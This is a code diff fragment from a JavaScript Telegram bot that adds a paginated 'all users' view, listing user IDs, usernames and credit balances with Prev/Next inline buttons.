+    if (data.startsWith('allusers_')) {
+        const page = parseInt(data.split('_')[1]);
+        const state = userStates.get(chatId);
+        if (state && state.state === 'allusers') {
+            const start = page * state.perPage;
+            const end = start + state.perPage;
+            const chunk = state.users.slice(start, end);
+            let msg = '👥 **ALL USERS**\n\n';
+            chunk.forEach(u => {
+                msg += `🆔 \`${u._id}\` | @${u.username || 'no_username'} | 💰${u.credits}\n`;
+            });
+            msg += `\nPage ${page+1}/${state.totalPages}`;
+            const markup = {
+                inline_keyboard: [
+                    ...(page > 0 ? [{ text: '◀️ Prev', callback_data: `allusers_${page-1}` }] : []),
+                    ...(page < state.totalPages-1 ? [{ text: 'Next ▶️', callback_data: `allusers_${page+1}` }] : [])
+                ]
+            };
+            bot.editMessageText(msg, { chat_id: chatId, message_id: callbackQuery.message.message_id, parse_mode: 'Markdown', reply_markup: markup });
+            state.page = page;
+            userStates.set(chatId, state);
+        }
+        bot.answerCallbackQuery(callbackQuery.id);
+        return;
     }
 });
 
